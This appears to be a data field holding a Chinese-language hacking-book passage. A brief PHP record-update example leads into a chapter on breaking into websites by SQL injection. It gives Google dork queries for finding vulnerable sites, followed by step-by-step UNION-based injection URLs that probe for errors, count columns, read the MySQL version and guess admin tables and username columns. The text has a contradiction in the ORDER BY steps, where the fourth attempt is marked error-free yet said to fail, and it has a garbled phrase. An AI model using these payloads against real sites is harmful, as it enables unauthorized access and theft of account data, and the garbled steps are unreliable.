  mdcn: "\n```php\n$sql = \"UPDATE Customers SET last_name='Ellison',email_id='peteEllison@gmail.com'\
    \ WHERE customer_id='1';\nif ($conn->query($sql) === TRUE) {\n    echo \"Record\
    \ successfully updated\";\n} else {\n    echo \"Error updating record: \" . $conn->error;\n\
    }\n$conn->close();\n?>\n```\n\nCustomer 表现在看起来如下：\n\n| customer_id | first_name\
    \ | last_name | email_id |\n|---|---|---|---|\n| 1 | pete | Ellison | peteEllison@gmail.com\
    \ |\n| 2 | shanks | Watson | shanksWatson@gmail.com |\n| 3 | luffy | Abrol | luffyAbrol@gmail.com\
    \ |\n\n# 第 5 章：使用 SQL 和 PHP 脚本黑入网站\n\n## 什么是 SQL 注入？\n\nSQL 注入是一种著名且广泛使用的黑客方法。这种方法让未经授权的人访问网站数据库。通过这种方式，攻击者可以获取网站数据库中的所有数据。\n\
    \n通过 SQL 注入，攻击者可以：\n\n- 绕过登录\n- 修改网站内容\n- 访问机数据\n- 关闭 MySQL 服务器\n\n你可以通过以下步骤实现\
    \ SQL 注入：\n\n### 步骤 1：寻找有漏洞的网站：\n\n你可以借助 Google Dork 列表找到一些有漏洞的网站。Google Dork\
    \ 利用其搜索技巧不断搜索有漏洞的网站。你可以在 Google 中搜到许多搜索技巧。\n\n在这里，为了寻找有漏洞的网站，我们将使用 \"inurl:\"\
    \ 命令。\n\n以下是几个示例：\n\n```\ninurl:index.php?id=\ninurl:gallery.php?id=\ninurl:article.php?id=\n\
    inurl:pageid=\n```\n\n如何使用？\n\n当你复制上述任何命令并将其粘贴到 Google 中时，你将得到一个网站列表。然后你必须通过逐一访问每个网站来检查其是否存在漏洞。\n\
    \n1). 检查漏洞\n\n假设有一个网站是有漏洞的，并且看起来像下面所示：\n\nhttp://www.site.com/news.php?id=5\n\n\
    你可以通过在 URL 末尾添加字符来检查该网站是否有漏洞。例如：\n\nhttp://www.site.com/news.php?id=5'\n\n当你得到类似\
    \ \"You have an error in your SQL syntax; check the manual that corresponds to\
    \ your MySQL server version for the right etc...\" 或类似的错误消息时，就可以说该网站是有漏洞的。\n\n\
    2). 寻找列数\n\n我们使用 `ORDER BY` 语句来查找列数。我们只需要不断增加数字，直到出现错误为止。\n\nhttp://www.site.com/news.php?id=5\
    \ order by 1/* <- 无错误\n\nhttp://www.site.com/news.php?id=5 order by 2/* <- 没错误\n\
    \nhttp://www.site.com/news.php?id=5 order by 3/* <- 没错误\n\nhttp://www.site.com/news.php?id=5\
    \ order by 4/* <- 没错误\n\n在上面的尝试中，我们在第四次尝试时报错。这意味着它有 3 列。\n\n3). 检查 UNION 函数\n\n\
    为了在单个 SQL 语句中选择更多数据，你可以使用 `UNION` 函数。\n\nhttp://www.site.com/news.php?id=5 union\
    \ all select 1,2,3/*\n\n（我们已经从上面的部分知道有 3 列）\n\n如果我们在屏幕上看到数字，说明 union 起作用了。\n\n\
    4). 检查 MySQL 版本\n\n现在网站的地址看起来像：http://www.site.com/news.php?id=5 union all select\
    \ 1,2,3/*\n\n假设屏幕上显示数字 2，为了检查版本，我们将数字 2 替换为 '@@version' 或 'version()'\n\n在添加 `@@version`\
    \ 后，地址看起来会像这样：http://www.site.com/news.php?id=5 union all select 1,@@version,3/*\n\
    \n这将显示类似 1.1.56-log 或类似的内容。这就是 MySQL 的版本。\n\n5). 获取表名和列名\n\n在发现 MySQL 版本小于 5 的情况下，你必须猜测表名和列名。\n\
    \n常见的表名有 admin/s、user/s、member/s 等。\n\n常见的列术语有：username, user_name, usr, user,\
    \ pass, pwd, password 等。\n\n例如：\n\nhttp://www.site.com/news.php?id=5 union all\
    \ select 1,2,3 from admin/*\n\n如果你仍然能在屏幕上看到数字，说明该表存在。\n\n在这里我们可以通过以下地址检查列名：\n\n\
    http://www.site.com/news.php?id=5 union all select 1,username,3 from admin/*\n\
    \n这将通过不断尝试的方法直到找到列名。如果你成功了，你将在屏幕上看到用户名。现在如果你想检查其他列，只需在代码中添加该单词即可：\n\nhttp://www.site.com/news.php?id=5\
    \ union all select 1,any name,3 from admin/*\n"
